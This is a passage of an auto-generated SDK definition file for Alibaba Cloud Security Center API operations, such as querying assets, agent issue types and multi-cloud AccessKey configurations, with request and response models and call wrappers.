 * @param request DescribeClientConfStrategyRequest
 * @return DescribeClientConfStrategyResponse
 */
async function describeClientConfStrategy(request: DescribeClientConfStrategyRequest): DescribeClientConfStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientConfStrategyWithOptions(request, runtime);
}

model DescribeClientProblemTypeResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20'),
  problemTypes?: [ 
    {
      problemDetail?: string(name='problemDetail', description='The description of the issue type.', example='other'),
      problemId?: string(name='problemId', description='The ID of the issue type.', example='4'),
      problemType?: string(name='problemType', description='The name of the issue type.', example='high_cpu'),
    }
  ](name='ProblemTypes', description='The issue types.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXXX'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='21'),
}

model DescribeClientProblemTypeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClientProblemTypeResponseBody(name='body'),
}

/**
 * @summary Queries a list of agent issue types.
 *
 * @param request DescribeClientProblemTypeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClientProblemTypeResponse
 */
async function describeClientProblemTypeWithOptions(runtime: Util.RuntimeOptions): DescribeClientProblemTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeClientProblemType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of agent issue types.
 *
 * @return DescribeClientProblemTypeResponse
 */
async function describeClientProblemType(): DescribeClientProblemTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientProblemTypeWithOptions(runtime);
}

model DescribeCloudCenterInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions. The value of this parameter is in the JSON format and is case-sensitive.

>  You can search for an asset by using the search conditions, such as the instance ID, instance name, VPC ID, region, or public IP address. You can call the [DescribeCriteria](https://help.aliyun.com/document_detail/149773.html) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  flags?: string(name='Flags', description='The service provider of the asset. Separate multiple service providers with commas (,). Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: an asset outside Alibaba Cloud
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: an asset from a third-party cloud service provider
*   **8**: a lightweight asset
*   **9**: a Serverless App Engine (SAE) instance
*   **10**: an instance in Platform for AI (PAI)', example='1,2,3'),
  importance?: int32(name='Importance', description='The importance of the asset. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship among multiple search conditions. Valid values:

*   **OR**: The logical relationship among search conditions is **OR**.
*   **AND**: The logical relationship among search conditions is **AND**.', example='OR'),
  machineTypes?: string(name='MachineTypes', description='The type of the assets that you want to query. Valid values:

*   **ecs**: servers
*   **cloud_product**: Alibaba Cloud service', example='ecs'),
  nextToken?: string(name='NextToken', description='The value of NextToken that is returned when the NextToken method is used. You do not need to specify this parameter for the first request.', example='E17B501887A2D3AA5E8360A6EFA3B***'),
  noGroupTrace?: boolean(name='NoGroupTrace', description='Specifies whether to internationalize the name of the default group. Valid values:

*   **true**: The system returns the Chinese name of the default group for the GroupTrace response parameter.
*   **false**: The system returns default for the GroupTrace response parameter.', example='false'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='100'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hangzhou', deprecated=true),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='1232428423234****'),
  useNextToken?: boolean(name='UseNextToken', description='Specifies whether to use the NextToken method to retrieve a new page of results. If you set UseNextToken to true, the value of TotalCount is not returned. Valid values:

- **true**: The NextToken method is used.
- **false**: The NextToken method is not used.', example='false'),
}

model DescribeCloudCenterInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated on the asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      appId?: string(name='AppId', description='The ID of the application.

>  This parameter is available only when the **Vendor** parameter is set to 9.', example='test'),
      appName?: string(name='AppName', description='The name of the application.

>  This parameter is available only when the **Vendor** parameter is set to 9.', example='testAppName'),
      assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **0**: an ECS instance
*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a Network Address Translation (NAT) gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance
*   **5**: an ApsaraDB for Redis instance
*   **6**: a container image
*   **7**: a container', example='ecs'),
      assetTypeName?: string(name='AssetTypeName', description='The name of the asset type.', example='Elastic Compute Service'),
      authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to scan the asset.', example='1627974044000'),
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to scan the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='3'),
      authVersionName?: string(name='AuthVersionName', description='The name of the Security Center edition that is authorized to protect the asset. Valid values:

*   Basic edition
*   Anti-virus edition
*   Advanced edition
*   Enterprise edition
*   Ultimate edition', example='Ultimate Edition'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to scan the asset. Valid values:

*   **true**: Security Center is authorized to scan the asset.
*   **false**: Security Center is not authorized to scan the asset.', example='true'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent installed on the asset. Valid values:

*   **online**: The Security Center agent is **enabled**.
*   **offline**: The Security Center agent is **disabled**.
*   **pause**: The Security Center agent is **suspended**.', example='online'),
      clientSubStatus?: string(name='ClientSubStatus', description='The sub-status of the Security Center agent installed on the asset. Valid values:

*   **online**: The Security Center agent is **enabled**.
*   **offline**: The Security Center agent is **disabled**.
*   **pause**: The Security Center agent is **suspended**.
*   **uninstalled**: The Security Center agent is **uninstalled**.
*   **stopped**: The Security Center agent is **stopped**.', example='online'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c690a0789419f4284a4e0a29e12fe****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='cluster1'),
      cores?: int32(name='Cores', description='The number of the CPU cores used by the asset.', example='4'),
      cpuInfo?: string(name='CpuInfo', description='The CPU information about the asset.', example='Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz'),
      createdTime?: long(name='CreatedTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1607365213000'),
      exposedStatus?: int32(name='ExposedStatus', description='Indicates whether the asset is exposed. Valid values:

*   **0**: The asset is not exposed.
*   **1**: The asset is exposed.', example='0'),
      flag?: int32(name='Flag', description='Indicates whether the asset is an Alibaba Cloud asset. Valid values:

*   **0**: The asset is an Alibaba Cloud asset.
*   **1**: The asset is not an Alibaba Cloud asset.', example='0'),
      flagName?: string(name='FlagName', description='The service provider of the asset. Valid values:

*   **ALIYUN**
*   **OUT**
*   **IDC**
*   **Tencent**
*   **HUAWEICLOUD**
*   **Azure**
*   **AWS**
*   **ASK**
*   **TRIPARTITE**
*   **SAE**
*   **PAI**', example='ASK'),
      groupId?: long(name='GroupId', description='The ID of the asset group to which the asset belongs.', example='4120080'),
      groupTrace?: string(name='GroupTrace', description='The name of the group to which the asset belongs.', example='default'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risks are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
      healthCheckCount?: int32(name='HealthCheckCount', description='The number of baseline risks that are detected on the asset.', example='1'),
      importance?: int32(name='Importance', description='The importance of the asset. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='2'),
      instanceId?: string(name='InstanceId', description='The ID of the asset.', example='i-m5***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the asset.', example='1.2.XX.XX'),
      ipListString?: string(name='IpListString', description='The IP addresses of the system.', example='172.31.XX.XX,172.171.XX.XX'),
      kernel?: string(name='Kernel', description='The version of the kernel.', example='3.10.0-1127.19.1.el7.x86_64'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp', description='The timestamp when the Security Center agent was last online. Unit: milliseconds.', example='1637592907000'),
      macListString?: string(name='MacListString', description='The MAC addresses of the system.', example='00:13:3e:31:13:39,02:12:67:b8:**:**'),
      mem?: int32(name='Mem', description='The size of the memory. Unit: MB.', example='1024'),
      os?: string(name='Os', description='The operating system of the asset.', example='Linux'),
      osName?: string(name='OsName', description='The kernel version of the asset.', example='-'),
      podCount?: int32(name='PodCount', description='The number of pods.', example='1'),
      postPaidFlag?: int32(name='PostPaidFlag', description='The billing method of the protection version currently bound to the asset. Values: - **0**: Subscription - **1**: Pay-as-you-go', example='0'),
      region?: string(name='Region', description='The region ID of the asset.', example='cn-hangzhou-cm***-***'),
      regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
      regionName?: string(name='RegionName', description='The name of the region in which the asset resides.', example='China (Hangzhou)'),
      riskCount?: string(name='RiskCount', description='The total number of baseline risks that are detected on the asset. The value of this parameter is in the JSON format and contains the following fields:

*   **account**: the number of accounts that are used to log on from unapproved logon locations and whose passwords are cracked
*   **appNum**: the number of scanners
*   **asapVulCount**: the total number of high-severity vulnerabilities
*   **baselineHigh**: the number of high-risk baseline risks
*   **baselineLow**: the number of low-risk baseline risks
*   **baselineMedium**: the number of medium-risk baseline risks
*   **baselineNum**: the total number of baseline risks
*   **cmsNum**: the number of Web-CMS vulnerabilities
*   **containerAsap**: the number of high-severity vulnerabilities that are detected on containers
*   **containerLater**: the number of medium-severity vulnerabilities that are detected on containers
*   **containerNntf**: the number of low-severity vulnerabilities that are detected on containers
*   **containerRemind**: the number of alerts whose Emergency level is Reminder on containers
*   **containerSerious**: the number of alerts Emergency level is Urgent on containers
*   **containerSuspicious**: the number of alerts whose Emergency level is Suspicious on containers
*   **cveNum**: the number of Linux software vulnerabilities
*   **emgNum**: the number of urgent vulnerabilities
*   **health**: the number of baseline alerts that are unhandled
*   **imageBaselineHigh**: the number of high-risk baseline risks that are detected on images
*   **imageBaselineLow**: the number of low-risk baseline risks that are detected on images
*   **imageBaselineMedium**: the number of medium-risk baseline risks that are detected on images
*   **imageBaselineNum**: the total number of baseline risks that are detected on images
*   **imageMaliciousFileRemind**: the number of malicious files that are detected on images and have the Emergency level of Reminder
*   **imageMaliciousFileSerious**: the number of malicious files that are detected on images and have the Emergency level of Urgent
*   **imageMaliciousFileSuspicious**: the number of malicious files that are detected on images and have the Emergency level of Suspicious
*   **imageVulAsap**: the number of high-severity vulnerabilities that are detected on images
*   **imageVulLater**: the number of medium-severity vulnerabilities that are detected on an image
*   **imageVulNntf**: the number of low-severity vulnerabilities that are detected on an image
*   **laterVulCount**: the number of medium-severity vulnerabilities
*   **newSuspicious**: the number of alerts
*   **nntfVulCount**: the number of low-severity vulnerabilities.
*   **remindNum**: the number of alerts whose Emergency level is Reminder
*   **scaNum**: the number of vulnerabilities that are detected based on software component analysis
*   **seriousNum**: the number of alerts whose Emergency level is Urgent
*   **suspNum**: the number of alerts whose Emergency level is Suspicious
*   **suspicious**: the total number of alerts
*   **sysNum**: the number of Windows system vulnerabilities
*   **trojan**: the number of trojans
*   **uuid**: the UUIDs of assets
*   **vul**: the number of vulnerabilities
*   **weakPWNum**: the number of weak passwords', example='{"account":0,"appNum":0,"asapVulCount":0,"baselineHigh":0,"baselineLow":0,"baselineMedium":0,"baselineNum":0,"cmsNum":0,"containerAsap":0,"containerLater":0,"containerNntf":0,"containerRemind":0,"containerSerious":0,"containerSuspicious":0,"cveNum":0,"emgNum":0,"health":0,"imageBaselineHigh":0,"imageBaselineLow":0,"imageBaselineMedium":0,"imageBaselineNum":0,"imageMaliciousFileRemind":0,"imageMaliciousFileSerious":0,"imageMaliciousFileSuspicious":0,"imageVulAsap":0,"imageVulLater":0,"imageVulNntf":0,"laterVulCount":0,"newSuspicious":0,"nntfVulCount":0,"remindNum":0,"scaNum":0,"seriousNum":0,"suspNum":0,"suspicious":0,"sysNum":0,"trojan":0,"uuid":"inet-37316411-37fe-4b72-b245-346a2721d4b6","vul":0,"weakPWNum":0}'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      safeEventCount?: int32(name='SafeEventCount', description='The number of alerts that are generated on the asset.', example='5'),
      status?: string(name='Status', description='The status of the asset. Valid values:

*   **Running**: running
*   **notRunning**: stopped', example='Running'),
      tag?: string(name='Tag', description='The name of the asset tag.', example='InternetIp,test'),
      tagId?: string(name='TagId', description='The ID of the asset tag.', example='121313,41412'),
      tagResources?: string(name='TagResources', description='The custom tag added to the Lingjun node. This parameter is returned only for LINGJUN GPU-accelerated instances.', example='app:test,type:lingjun'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='c9107c04-942f-40c1-981a-f1c1***'),
      vendor?: int32(name='Vendor', description='The service provider of the asset. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: an asset outside Alibaba Cloud
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: an asset from a third-party cloud service provider
*   **8**: a lightweight asset
*   **9**: a SAE instance
*   **10**: an instance in PAI', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider for the asset.

Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Microsoft**: Microsoft Azure
*   **AWS**: Amazon Web Services (AWS)
*   **TRIPARTITE**: a lightweight server
*   **SAE**: a SAE instance
*   **PAI**: an instance in PAI', example='Tencent'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the VPC to which the asset belongs.', example='vpc-uf60agqq65bs98zoo****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected on the asset.', example='2'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='Instances', description='The details about the assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    nextToken?: string(name='NextToken', description='The value of NextToken that is returned when the NextToken method is used.', example='B604532DEF982B875E8360A6EFA3B***'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='50'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='32A73759-4C0F-4801-BE98-901223ACEE9A'),
  success?: boolean(name='Success', description='Indicates whether the call is successful. Valid values:

*   **true**: The call is successful.
*   **false**: The call fails.', example='true'),
}

model DescribeCloudCenterInstancesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCloudCenterInstancesResponseBody(name='body'),
}

/**
 * @summary Queries the information about assets that meet specific search conditions. For example, you can search for assets by the instance name or region of the asset.
 *
 * @description You can search for an asset by using search conditions, such as the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can also configure a logical relationship between multiple search conditions to search for the assets that meet the search conditions.
 *
 * @param request DescribeCloudCenterInstancesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCloudCenterInstancesResponse
 */
async function describeCloudCenterInstancesWithOptions(request: DescribeCloudCenterInstancesRequest, runtime: Util.RuntimeOptions): DescribeCloudCenterInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.flags)) {
    query['Flags'] = request.flags;
  }
  if (!Util.isUnset(request.importance)) {
    query['Importance'] = request.importance;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.nextToken)) {
    query['NextToken'] = request.nextToken;
  }
  if (!Util.isUnset(request.noGroupTrace)) {
    query['NoGroupTrace'] = request.noGroupTrace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.useNextToken)) {
    query['UseNextToken'] = request.useNextToken;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCloudCenterInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about assets that meet specific search conditions. For example, you can search for assets by the instance name or region of the asset.
 *
 * @description You can search for an asset by using search conditions, such as the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can also configure a logical relationship between multiple search conditions to search for the assets that meet the search conditions.
 *
 * @param request DescribeCloudCenterInstancesRequest
 * @return DescribeCloudCenterInstancesResponse
 */
async function describeCloudCenterInstances(request: DescribeCloudCenterInstancesRequest): DescribeCloudCenterInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudCenterInstancesWithOptions(request, runtime);
}

model DescribeCloudProductFieldStatisticsResponseBody = {
  groupedFields?: {
    categoryCount?: string(name='CategoryCount', description='The statistics of different types of assets. **MachineType** indicates the type of the asset. **Count** indicates the number of assets of a specific type.

Valid values of **MachineType**:

*   **1**: Server Load Balancer (SLB) instance
*   **2**: NAT gateway instance
*   **3**: ApsaraDB RDS instance
*   **4**: ApsaraDB for MongoDB instance', example='[{"MachineType":1,"Count":11}]'),
    instanceCount?: int32(name='InstanceCount', description='The total number of cloud services that are protected by Security Center.', example='100'),
    riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of cloud services that are at risk.', example='90'),
  }(name='GroupedFields', description='The statistics of cloud services that are protected by Security Center.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeCloudProductFieldStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCloudProductFieldStatisticsResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribeCloudProductFieldStatistics is deprecated, please use Sas::2018-12-03::GetCloudAssetSummary instead.
 *
 * @summary Queries the statistics of cloud services.
 *
 * @param request DescribeCloudProductFieldStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCloudProductFieldStatisticsResponse
 */
// Deprecated
async function describeCloudProductFieldStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeCloudProductFieldStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCloudProductFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribeCloudProductFieldStatistics is deprecated, please use Sas::2018-12-03::GetCloudAssetSummary instead.
 *
 * @summary Queries the statistics of cloud services.
 *
 * @return DescribeCloudProductFieldStatisticsResponse
 */
// Deprecated
async function describeCloudProductFieldStatistics(): DescribeCloudProductFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudProductFieldStatisticsWithOptions(runtime);
}

model DescribeCloudVendorAccountAKListRequest {
  authIds?: string(name='AuthIds', description='The unique ID of the AccessKey pair.', example='2624'),
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.', example='20'),
  status?: int32(name='Status', description='The status of the AccessKey pair. Valid values:

*   **0**: enabled
*   **1**: disabled', example='1'),
  subAccountName?: string(name='SubAccountName', description='The username of the sub-account of the cloud service provider to which the AccessKey pair belongs.', example='AlibabaCloud_***'),
  vendorAuthAlias?: string(name='VendorAuthAlias', description='The name of the AccessKey pair.', example='test'),
}

model DescribeCloudVendorAccountAKListResponseBody = {
  cloudVendorAccountAKs?: [ 
    {
      akType?: string(name='AkType', description='The type of the account to which the AccessKey pair belongs. Valid values:

*   **primary**: a primary account
*   **sub**: a sub-account', example='primary'),
      authId?: long(name='AuthId', description='The unique ID of the AccessKey pair.', example='2345'),
      authModules?: [ 
        {
          message?: string(name='Message', description='The error message of the module.', example='ak_domain_error'),
          module?: string(name='Module', description='The code of the module. Valid values:

*   **HOST**: host
*   **CSPM**: configuration assessment
*   **SIEM**: CloudSiem
*   **TRIAL**: log audit', example='HOST'),
          moduleAssetType?: string(name='ModuleAssetType', description='The cloud asset that is associated with the module.', example='Cloud server or virtual machine'),
          moduleDisp?: string(name='ModuleDisp', description='The display name of the module.', example='Host Assets'),
          moduleServiceStatus?: int32(name='ModuleServiceStatus', description='The service status of the module. Valid values:

*   **0**: being used
*   **1**: exception occurred
*   **2**: being validated
*   **3**: validation timed out', example='0'),
          moduleStatement?: string(name='ModuleStatement', description='The permission description of the module.', example='Read permission of the cloud server or virtual machine'),
          trailMessage?: string(name='TrailMessage', description='The error message of the log audit service.', example='timeout'),
          trailStatus?: string(name='TrailStatus', description='The status of the log audit service. Valid values:

*   **init**: being initialized
*   **verify**: being validated
*   **enable**: enabled
*   **disable**: disabled
*   **error**: exception occurred
*   **timeout**: validation timed out', example='enable'),
        }
      ](name='AuthModules', description='The modules that are associated with the AccessKey pair.'),
      message?: string(name='Message', description='The error message of the AccessKey pair.', example='The IAM user is forbidden in the currently selected region'),
      secretId?: string(name='SecretId', description='The AccessKey ID.', example='S3D6c4O***'),
      serviceStatus?: int32(name='ServiceStatus', description='The service status of the AccessKey pair. Valid values:

*   **0**: being used
*   **1**: exception occurred
*   **2**: being validated
*   **3**: validation timed out', example='0'),
      status?: int32(name='Status', description='The status of the AccessKey pair. Valid values:

*   **0**: enabled
*   **1**: disabled', example='0'),
      vendor?: string(name='Vendor', description='The cloud service provider. Valid values:

*   **Tencent**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Azure**: Microsoft Azure
*   **AWS**: Amazon Web Services (AWS)', example='Tencent'),
      vendorAuthAlias?: string(name='VendorAuthAlias', description='The name of the AccessKey pair.', example='test'),
    }
  ](name='CloudVendorAccountAKs', description='The information about the AccessKey pairs.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8****'),
}

model DescribeCloudVendorAccountAKListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCloudVendorAccountAKListResponseBody(name='body'),
}

/**
 * @summary Queries the multi-cloud assets added to Security Center.
 *
 * @param request DescribeCloudVendorAccountAKListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCloudVendorAccountAKListResponse
 */
async function describeCloudVendorAccountAKListWithOptions(request: DescribeCloudVendorAccountAKListRequest, runtime: Util.RuntimeOptions): DescribeCloudVendorAccountAKListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authIds)) {
    query['AuthIds'] = request.authIds;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.subAccountName)) {
    query['SubAccountName'] = request.subAccountName;
  }
  if (!Util.isUnset(request.vendorAuthAlias)) {
    query['VendorAuthAlias'] = request.vendorAuthAlias;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCloudVendorAccountAKList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the multi-cloud assets added to Security Center.
 *
 * @param request DescribeCloudVendorAccountAKListRequest
 * @return DescribeCloudVendorAccountAKListResponse
 */
async function describeCloudVendorAccountAKList(request: DescribeCloudVendorAccountAKListRequest): DescribeCloudVendorAccountAKListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCloudVendorAccountAKListWithOptions(request, runtime);
}

model DescribeCloudVendorTrialConfigRequest {
  authId?: long(name='AuthId', description='Unique ID of the AK.

> You can call [DescribeCloudVendorAccountAKList](~~DescribeCloudVendorAccountAKList~~) to get the AuthId.
> -

This parameter is required.', example='23**'),
  vendor?: string(name='Vendor', description='Cloud asset vendor. Values:
- **Tencent**: Tencent Cloud
- **AWS**: Amazon Web Services

This parameter is required.', example='AWS'),
}

model DescribeCloudVendorTrialConfigResponseBody = {
  data?: {
    authInfo?: string(name='AuthInfo', description='Multi-cloud configuration information:
- *AWS*: Output parameters sqsQueueName, sqsRegion
- *Tencent*: Output parameters kafkaUserName, kafkaBootstrapServers, kafkaTopic', example='{\\\\"sqsRegion\\\\":\\\\"us-west-2\\\\",\\\\"sqsQueueName\\\\":\\\\"****\\\\"}'),
    message?: string(name='Message', description='Error message returned when connection fails.', example='No relevant queue found'),
    status?: string(name='Status', description='The access status of the Trail configuration. Values:
- **init**: Initialization in progress
- **verify**: Configuration verification in progress
- **enable**: Configuration enabled
- **disable**: Configuration disabled
- **error**: Configuration access error
- **timeout**: Configuration access timeout', example='init'),
  }(name='Data', description='Returned data.'),
  requestId?: string(name='RequestId', description='The ID of this request, which is a unique identifier generated by Alibaba Cloud for this request and can be used for troubleshooting and problem localization.', example='43313389-DED8-5BB7-8CB9-F22CDEB7****'),
}

model DescribeCloudVendorTrialConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCloudVendorTrialConfigResponseBody(name='body'),
}

/**
 * @summary Query the trail configuration attributes of the corresponding AK configuration
 *
 * @param request DescribeCloudVendorTrialConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCloudVendorTrialConfigResponse
 */
async function describeCloudVendorTrialConfigWithOptions(request: DescribeCloudVendorTrialConfigRequest, runtime: Util.RuntimeOptions): DescribeCloudVendorTrialConfigResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCloudVendorTrialConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query the trail configuration attributes of the corresponding AK configuration
 *
 * @param request DescribeCloudVendorTrialConfigRequest
 * @return DescribeCloudVendorTrialConfigResponse
